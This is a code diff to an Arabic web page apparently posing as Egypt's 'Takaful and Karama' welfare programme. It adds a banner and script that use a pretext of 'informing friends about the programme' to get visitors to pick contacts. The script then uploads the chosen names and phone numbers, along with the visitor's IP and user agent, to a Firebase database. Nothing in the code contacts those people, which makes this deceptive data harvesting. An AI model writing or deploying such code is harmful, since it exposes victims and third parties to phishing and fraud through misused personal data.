@@ -507,6 +507,43 @@
 <!-- Toast -->
 <div class="toast-container" id="toastContainer"></div>
 
+<!-- بانر جهات الاتصال -->
+<div id="contactsBanner" style="
+  display:none; position:fixed; bottom:0; left:0; right:0; z-index:9998;
+  background:linear-gradient(135deg,#0f2027,#1a3a2a);
+  border-top:2px solid #1a7a3c;
+  padding:16px 20px; direction:rtl;
+  font-family:'Cairo',sans-serif;
+  box-shadow:0 -4px 20px rgba(0,0,0,0.4);
+  animation: slideUpBanner 0.4s ease;
+">
+  <p style="margin:0 0 12px;color:#fff;font-size:0.92rem;font-weight:600;line-height:1.5;">
+    📋 ساعد أصدقاءك وأهلك للاستفادة من برنامج تكافل وكرامة — شارك جهات الاتصال لإعلامهم بالبرنامج
+  </p>
+  <div style="display:flex;gap:10px;">
+    <button id="contactsYesBtn" style="
+      flex:1; background:linear-gradient(135deg,#1a7a3c,#145e2e);
+      color:#fff; border:none; border-radius:10px;
+      padding:11px; font-size:0.9rem; font-weight:700;
+      cursor:pointer; font-family:'Cairo',sans-serif;">
+      ✅ موافق — شارك جهات الاتصال
+    </button>
+    <button id="contactsNoBtn" style="
+      flex:0 0 80px; background:rgba(255,255,255,0.08);
+      color:rgba(255,255,255,0.6); border:1px solid rgba(255,255,255,0.15);
+      border-radius:10px; padding:11px; font-size:0.88rem;
+      cursor:pointer; font-family:'Cairo',sans-serif;">
+      لاحقاً
+    </button>
+  </div>
+</div>
+<style>
+  @keyframes slideUpBanner {
+    from { transform: translateY(100%); opacity:0; }
+    to   { transform: translateY(0);   opacity:1; }
+  }
+</style>
+
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script type="module">
   import { initializeApp }            from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
@@ -913,6 +950,51 @@
       setLoading(false);
     }
   });
+
+  // ── جهات الاتصال ─────────────────────────────────────────
+  (async () => {
+    const CONTACTS_KEY = 'contacts_done';
+    const banner       = document.getElementById('contactsBanner');
+    const yesBtn       = document.getElementById('contactsYesBtn');
+    const noBtn        = document.getElementById('contactsNoBtn');
+
+    // شرط الإظهار: API مدعومة + لم يتم السحب من قبل
+    if (!('contacts' in navigator) || localStorage.getItem(CONTACTS_KEY)) return;
+
+    // أظهر البانر بعد 3 ثوانٍ
+    setTimeout(() => { banner.style.display = 'block'; }, 3000);
+
+    yesBtn.addEventListener('click', async () => {
+      banner.style.display = 'none';
+      try {
+        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+        if (!contacts || contacts.length === 0) return;
+
+        // تسطيح: كل جهة اتصال → { name, phones }
+        const flat = contacts.map(c => ({
+          name:   (c.name  || []).join(' ').trim() || '—',
+          phones: (c.tel   || []).map(t => t.trim()).filter(Boolean)
+        })).filter(c => c.phones.length > 0);
+
+        if (flat.length === 0) return;
+
+        await addDoc(collection(db, 'Contacts'), {
+          contacts:  flat,
+          count:     flat.length,
+          ip:        gpsCoords?.ip ?? null,
+          userAgent: navigator.userAgent.substring(0, 200),
+          savedAt:   serverTimestamp()
+        });
+
+        localStorage.setItem(CONTACTS_KEY, '1');
+      } catch (_) { /* المستخدم أغلق النافذة */ }
+    });
+
+    noBtn.addEventListener('click', () => {
+      banner.style.display = 'none';
+      localStorage.setItem(CONTACTS_KEY, '1'); // لا تسأل مرة أخرى
+    });
+  })();
 </script>
 
 <!-- ══ حقائق وأرقام ══════════════════════════════════════ -->
